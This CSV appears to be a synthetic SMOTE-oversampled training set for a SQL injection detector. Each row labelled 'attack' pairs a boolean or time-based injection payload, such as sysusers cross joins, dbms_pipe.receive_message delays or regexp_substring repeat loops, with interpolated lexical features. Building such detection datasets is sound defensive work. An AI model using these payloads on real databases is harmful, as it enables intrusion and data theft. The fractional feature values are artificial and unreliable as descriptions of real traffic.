id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000999,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,2.6134613178835493,186.73116766778503,29.38521956082881,3.644132732933473,97.13209581016287,10.459121756684764,57.295608783423816,21.844341317513575,0.5186279174081025,0.055786495409474335,0.30651490825209426,0.11907067893032883,2.459121756684763,1.5408782433152366,0.0,0.0,1.0,2.0,0.0,7.229560878342382,2.0,0.0,4.459121756684764,3.0,0.6147804391711909,0.3852195608288092,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.3852195608288091,0.6147804391711909,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001000,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,0.975758398379512,228.49707927567766,35.467459284743,3.7447893586172376,69.15978285196266,27.0,92.22486428247667,40.11243214123833,0.3020420083261857,0.11851245967657578,0.4038544227650592,0.17559110923217938,0.7100542870093329,0.0,1.6449728564953334,0.0,0.0,1.1775135717523333,0.0,21.289945712990665,0.3550271435046666,1.8224864282476667,3.8224864282476667,12.112432141238333,0.1775135717523333,0.0,0.8224864282476667,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1775135717523333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.6449728564953325,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.822486428247666
SMOTE_001001,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,1.6869929263917225,378.47541055188873,31.0,3.3690787302627507,95.15245894481113,58.0,173.47541055188873,51.84754105518887,0.25164775049618016,0.1533501468329207,0.4579865499870907,0.13701555268380844,0.0,0.0,2.1524589448111273,0.0,0.0,3.0,0.0,35.69508211037774,0.0,0.0,1.0,15.152458944811128,0.0,0.0,0.5762294724055635,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.5762294724055635,0.0,0.4237705275944365,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001002,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,0.6799612218252518,85.51040246242002,19.307905665080586,2.8853240477652435,5.923716995241762,23.2815534481453,44.92094334919414,11.384188669838828,0.07653908074860394,0.2737096216112055,0.5175617241842936,0.1321895734558969,0.0,0.10263522169352868,1.1026352216935287,0.0,0.8973647783064714,2.0,0.0,7.2815534481453,0.0,0.0,-2.220446049250313e-16,4.0,0.0,0.10263522169352869,0.10263522169352868,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.10263522169352868,0.0,1.0,0.8973647783064713,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001003,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,2.6564884201280363,129.06592562122253,36.51922830618991,3.8735891384263845,40.032962810611274,19.02197520707418,50.513734504421365,19.497253099115728,0.30851762003515504,0.14575875704124028,0.39297705687086243,0.15274656605274228,4.4917592973471825,0.0,1.0054938017685449,1.0,0.0,2.0,0.0,8.502746900884272,0.9945061982314551,0.0,1.0,4.508240702652817,1.0,0.0,0.5027469008842723,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5027469008842724,0.0,0.5027469008842724,0.0,0.49725309911572757,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.502746900884272
SMOTE_001004,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,1.598261193930849,221.191344283137,35.430726412583866,3.7609952456474054,67.16117450696287,26.1460896188758,88.8765377132548,39.00754244404354,0.30294256876596226,0.1186862631748799,0.4018252490002882,0.17654591905886965,1.1385471748322669,0.0,1.4307264125838666,0.0,0.0,1.2846367937080667,0.0,20.2921792377516,0.5692735874161334,1.7153632062919333,3.7153632062919333,11.576816031459666,0.2846367937080667,0.0,0.7153632062919333,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.28463679370806677,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.430726412583867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.715363206291933
SMOTE_001005,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,5.318431672571857,207.52493140742303,34.615778696871175,4.047708841598148,66.9262295749694,46.14583316361946,68.22301896153358,26.229849707300595,0.35730161792338655,0.1991892714079254,0.3134543927314883,0.13005471793719975,1.6157786968711738,0.0,2.0,0.0,1.461407101042942,2.0,0.0,10.998292313558247,0.0,2.69296449478529,4.922814202085885,6.0,0.538592898957058,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.461407101042942,0.0,2.9228142020858843,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.461407101042942,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.384221303128826
SMOTE_001006,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,0.5349892023381448,31.385917819717434,15.898320517291523,3.223055825551927,9.268217200882148,2.6869509838111654,12.849483417953131,6.581266217070983,0.2960116235239322,0.0773656030045342,0.40797675295213565,0.21864602051939797,0.15852715011026874,0.9471576166299103,0.10568476674017924,1.9471576166299103,0.9471576166299104,0.05284238337008973,0.0,2.3698966835906266,0.0,0.0,0.05284238337008951,3.0528423833700895,0.05284238337008956,0.9471576166299104,0.05284238337008962,0.0,0.9471576166299104,0.05284238337008962,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05284238337008973,0.9471576166299104,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001007,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000028,2.9761551178117966,175.6368389516972,29.561320016639726,3.7281689855864277,90.79247940096982,9.754719933441093,53.77359966720546,21.31603995008082,0.5152274891112542,0.055290247167148185,0.30581001018060827,0.1236722535409894,1.7547199334410928,2.2452800665589066,0.0,0.0,1.0,2.0,0.0,6.877359966720547,2.0,0.0,3.754719933441093,3.0,0.4386799833602732,0.5613200166397267,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.5613200166397267,0.43867998336027325,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001008,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,1.1023384305016726,252.3050408377176,36.4491598603804,3.784541454085575,78.4067211169568,29.0,100.0,44.898319720760796,0.31061816735382536,0.11495635586591368,0.3964012271238403,0.17802424965642066,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.8983197207607996,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001009,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,1.1367091824137268,56.58097708939553,17.379048854469776,3.3547406273816796,6.620951145530221,20.75809770893955,22.06478167151642,7.137146563409324,0.12642966441302736,0.3819140669456839,0.3668605064145783,0.12479576222671038,0.0,0.0,2.620951145530224,0.0,0.18952442723488802,2.0,0.0,2.3266709906442156,0.0,0.0,-2.220446049250313e-16,4.810475572765112,0.0,0.0,0.8104755727651121,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.810475572765112,0.0,0.18952442723488794,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001010,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.425212135463452,232.10349744684254,36.736821809733826,3.8462770965502813,69.42054524334557,33.57868352653969,90.26240696015142,38.841861716805866,0.2994951734615566,0.14450828416747075,0.3876415506571979,0.16835499171377472,1.0527127610647105,0.0,1.473643619467645,0.0,0.0,2.0,0.0,19.368218097338225,0.0,2.0,3.2104654292014674,12.947287238935289,0.2631781902661775,0.0,0.7368218097338225,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.26317819026617756,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.157752668136758,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.420930858402935
SMOTE_001011,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,0.4904081310034994,206.4460268364265,29.07228528831069,3.4947985164602478,108.39772962081516,11.71085884675724,63.554294233786194,22.78314413506793,0.5246705511447628,0.05666833913887086,0.3077675271858961,0.11089358253047019,3.7108588467572394,0.2891411532427606,0.0,0.0,1.0,2.0,0.0,7.855429423378619,2.0,0.0,5.710858846757239,3.0,0.9277147116893099,0.07228528831069014,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0722852883106901,0.9277147116893099,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001012,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000027,3.931191776188507,227.87129458176565,34.023166177230124,3.9591370511847517,62.18532941784102,58.19562106298742,79.87773184780751,27.612612253129704,0.3015611152442215,0.23630266320356957,0.33794472475752874,0.1241914967946802,1.0231661772301268,0.0,2.0,0.0,1.6589446075899579,2.0,0.0,13.56627989866945,0.0,1.705276962050211,5.317889215179916,6.0,0.3410553924100422,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.6589446075899577,0.0,3.3178892151799153,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6589446075899577,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.976833822769874
SMOTE_001013,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,0.5590948363729161,210.34256396103217,29.32871801948391,3.478786118999194,106.48012723209621,13.23269257306467,66.56141059254858,24.068333563322714,0.5055046867204662,0.06312860097084629,0.31674622318214135,0.11462048912654618,4.0,0.0,0.0,0.0,0.9178204951290222,2.0,0.0,8.82179504870978,2.0,0.08217950487097792,5.753461485387067,3.4108975243548896,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.08217950487097794,0.9178204951290221,0.0,0.0,0.9178204951290221,1.082179504870978,0.9178204951290221,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.41089752435488913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.246538514612934
SMOTE_001014,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,1.611180734585449,226.76639936017136,35.0666434226236,3.729004819777117,65.2998954018062,28.0333217113118,92.2665736904944,41.166608556559,0.28688073283077253,0.12445983984552333,0.4074967240967014,0.18116270322700273,4.0,0.0,0.0,0.0,0.0,2.0,0.0,20.0666434226236,2.0,1.5166608556558994,3.5166608556559,10.0666434226236,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.4833391443441002,0.5166608556558997,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0333217113118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0333217113118
SMOTE_001015,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.7083232944726123,158.5585323922739,36.720733803863055,4.2097674825174884,76.55853239227389,16.558532392273882,46.76587043090447,18.675597176821647,0.4828243534875972,0.1044031487224245,0.29508067408471067,0.1176918237052676,0.8377985884108248,0.7207338038630584,2.0,0.0,1.0,2.0,0.0,5.720733803863058,0.0,1.396330980684708,2.558532392273883,5.279266196136941,0.2792661961369416,0.7207338038630584,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.2792661961369416,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.279266196136941
SMOTE_001016,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,0.5824933563702187,210.32893820457315,33.42282335795614,3.700882700737427,59.66446910228657,27.28188223863743,86.25505790909942,37.12752895454972,0.28230400247866466,0.13028766083106197,0.41074366746572083,0.17666466922455248,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.563764477274855,1.7181177613625718,1.1409411193187142,3.140941119318714,8.563764477274857,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.8590588806812858,0.14094111931871417,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.281882238637428,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.2818822386374285
SMOTE_001017,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,1.5900941744184716,64.73839529989374,24.164087844420834,3.7492857543595965,14.0,20.787153727736463,21.24613176663125,8.705109805526043,0.22058840991319734,0.31973617308276747,0.32808122833540004,0.13159418866863506,0.0,1.0,2.5410219611052085,0.0,0.0,2.0,0.0,2.082043922210417,0.0,0.5410219611052087,0.5410219611052087,4.5410219611052085,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.45897803889479133,0.5410219611052087,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001018,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,1.2018341322788142,75.5645889111447,18.022879193537797,2.8337378376581417,4.511439596768895,20.335796975766733,40.18303354830237,10.534318790306694,0.06401030388523082,0.2684520148631086,0.522534606101773,0.14500307514988744,0.24428020161555097,0.0,1.244280201615551,0.0,0.755719798384449,1.7557197983844488,0.0,6.534318790306693,0.0,0.0,-2.220446049250313e-16,3.755719798384449,0.24428020161555103,0.0,0.24428020161555103,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.7557197983844489,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7557197983844492
SMOTE_001019,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,2.187902813368418,68.95115565202883,26.24600389409573,3.876021072889452,20.065719848708184,16.39342801512918,22.852575878966547,9.63943190922491,0.28678284674837917,0.24603004539571446,0.3309489211204292,0.1362381867354772,0.0,2.8197159546124544,1.3934280151291818,0.0,0.0,1.3934280151291818,0.0,2.8197159546124553,0.0,0.6065719848708182,0.606571984870818,2.786856030258363,0.0,1.0,0.3934280151291818,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.39342801512918174,0.0,1.0,0.6065719848708182,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001020,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,2.219086982918716,212.0093324836226,36.543325092390404,3.8517458153011805,63.49647712497925,26.71662546195201,83.10302841844488,38.69320147824643,0.3001035618744445,0.12851809853702897,0.3894559387031583,0.18192240088536824,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.43325092390402,1.0866501847808046,2.0,2.6299752771712064,11.086650184780805,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.45667490760959784,0.0,0.4566749076095978,0.0,0.5433250923904023,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.803275646732815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.259950554342413
SMOTE_001021,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,2.413335035180196,165.24106941787122,36.0,4.054409128532668,60.31139071468464,21.930802063403412,55.41294089914585,27.585935740637314,0.36700219865162154,0.13238798663031487,0.3340471241715259,0.16656269054653766,3.655133677233902,0.0,0.6897326455321959,0.0,0.34486632276609797,2.0,0.0,9.585935740637316,0.0,3.034598968298293,2.034598968298294,8.620534708935608,1.0,0.0,0.34486632276609785,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6551336772339021,1.344866322766098,0.0,1.0,0.34486632276609785,0.3448663227660979,0.6551336772339021,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6897326455321955
SMOTE_001022,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,0.16597580485642258,130.22457074810583,29.337812620167128,3.9461746774678472,65.4644923527298,8.337812620167128,41.33781262016713,15.084453155041782,0.5029105296278709,0.06367291051009288,0.31750419131239427,0.11591236854964196,0.0,0.042226577520891095,2.0,0.0,1.0,1.042226577520891,0.0,6.0,0.0,0.0,2.0,4.042226577520891,0.0,0.04222657752089112,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.042226577520891095,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.042226577520891
SMOTE_001023,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,1.4742147355796102,191.68374547002057,36.272226959425524,3.911067059500281,57.805673985638094,27.538950472531813,73.0723974987444,33.266723513106285,0.30206541107880835,0.14346717525921687,0.3796705605783791,0.1747968530835957,2.911092162297904,0.0,0.5444539188510481,0.0,0.0,2.0,0.0,14.72226959425524,0.0,2.0,1.816680878276572,11.088907837702095,0.727773040574476,0.0,0.2722269594255239,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.727773040574476,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9055887159786677,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.633361756553144
SMOTE_001024,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.1335277402968837,132.17984894032736,29.733811293921697,3.98780447909136,65.97841505856226,9.956830117124529,41.0,15.244603764640566,0.4994827689394723,0.07440726572695958,0.3107122062150114,0.11539775911855675,0.0,0.24460376464056593,2.0,0.0,1.0,1.244603764640566,0.0,5.755396235359434,0.0,0.0,2.0,4.244603764640566,0.0,0.24460376464056605,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.24460376464056605,1.0,0.7553962353594339,0.2446037646405661,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2446037646405657
SMOTE_001025,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.7983473423337117,59.097161471153925,21.638485752545243,3.608723744515324,12.915457257635722,17.843533244061103,21.615142474547582,6.723028494909514,0.23064144812539528,0.30433964931843593,0.3528261347536969,0.11219276780247187,0.0,0.8794952508484137,1.879495250848414,0.0,0.12050474915158627,2.0,0.0,1.8435332440611027,0.0,0.0,-2.220446049250313e-16,4.0,0.0,0.8794952508484138,0.8794952508484138,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8794952508484137,0.0,1.0,0.12050474915158627,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
